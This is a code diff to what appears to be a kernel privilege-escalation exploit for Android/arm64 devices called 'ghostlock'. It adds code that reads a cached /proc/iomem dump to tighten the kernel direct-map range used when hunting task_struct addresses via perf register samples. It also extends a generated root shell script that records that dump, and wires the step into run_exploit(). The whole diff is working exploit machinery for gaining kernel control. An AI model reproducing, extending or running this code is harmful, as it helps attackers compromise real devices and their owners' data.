@@ -519,6 +519,82 @@ static void init_runtime_paths(void) {
   pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
 }
 
+/* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
+ * A nested bank lies inside its parent, so it cannot widen either bound. */
+static int iomem_map_span(FILE *f, uint64_t *map_span) {
+  unsigned long long base = 0, top = 0;
+  char *line = NULL;
+  size_t cap = 0;
+  int found = 0;
+
+  while (getline(&line, &cap, f) > 0) {
+    size_t len = strlen(line);
+    unsigned long long a, b;
+    int used = 0;
+
+    while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
+      line[--len] = '\0';
+    }
+    /* %n pins the match to the whole line, since sscanf returns 2 even when a
+     * trailing literal mismatches */
+    if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
+        used == (int)len) {
+      if (!found || a < base) {
+        base = a;
+        found = 1;
+      }
+      if (b + 1 > top) top = b + 1;
+    }
+  }
+  free(line);
+
+  /* the map starts at the dram base the kernel rounded down to a gib, which is
+   * what memstart_addr holds */
+  base &= ~((1ULL << 30) - 1);
+  if (!found || top <= base) return 0;
+  *map_span = top - base;
+  return 1;
+}
+
+/* A rooted run leaves its /proc/iomem in the home dir, the only source for this
+ * unit's direct map size. */
+static void apply_iomem_cache(void) {
+  char path[300], stamp[128] = "";
+  uint64_t span = 0;
+  int ok = 0;
+  const char *release = active_offsets ? active_offsets->uname_r : "";
+
+  snprintf(path, sizeof(path), "%s/.ghostlock_iomem", g_home_dir);
+  FILE *f = fopen(path, "r");
+  if (f) {
+    /* the first line names the release that wrote the dump */
+    if (fgets(stamp, sizeof(stamp), f)) {
+      stamp[strcspn(stamp, "\r\n")] = '\0';
+      ok = strncmp(stamp, "# ", 2) == 0 && strcmp(stamp + 2, release) == 0 &&
+           iomem_map_span(f, &span);
+    }
+    fclose(f);
+  }
+
+  /* the base is rounded down to a gib, so a span under that holds no real bank,
+   * and the span has to cover the dram the unit reports. it also stays inside
+   * the bound the built-in geometry already uses, so a measured end can only
+   * narrow what this build would otherwise trust. an unmeasurable ram rejects
+   * the dump */
+  long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
+  uint64_t dram = (pages > 0 && page_sz > 0)
+                      ? (uint64_t)pages * (uint64_t)page_sz : 0;
+  if (!ok || !dram || span < (1ULL << 30) || span < dram ||
+      span >= DIRECT_MAP_END - DIRECT_MAP_BASE) {
+    pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
+    return;
+  }
+
+  g_direct_map_end = DIRECT_MAP_BASE + span;
+  pr_info("iomem cache: direct_map_end=%016llx\n",
+          (unsigned long long)g_direct_map_end);
+}
+
 static void write_root_script(void) {
   char script[8192];
   int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
@@ -557,6 +633,16 @@ static void write_root_script(void) {
       "if [ \"$(id -u)\" -ne 0 ]; then\n"
       "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
       "  exit 1\n"
+      "fi\n"
+      /* the rename is atomic, so a failed read leaves the old dump in place */
+      "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
+      "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
+      "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
+      "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
+      "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
+      "else\n"
+      "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
+      "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
       "fi\n"
       "KVER=$(uname -r | cut -d. -f1-2)\n"
       "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
@@ -736,7 +822,7 @@ static uintptr_t perf_find_task(void) {
           uint64_t v = regs[i];
           /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
           v |= 0x0fULL << 56;
-          if (v > 0xffffff8000000000ULL && v < DIRECT_MAP_END)
+          if (v > 0xffffff8000000000ULL && v < g_direct_map_end)
             cands[nc++] = v;
         }
       }
@@ -1043,6 +1129,7 @@ int run_exploit(int argc, char **argv) {
 
   if (!active_offsets && select_offsets() < 0) return 1;
 
+  apply_iomem_cache();
   log_startup_context();
   init_p0_profile();
   pin_to_core(CORE);
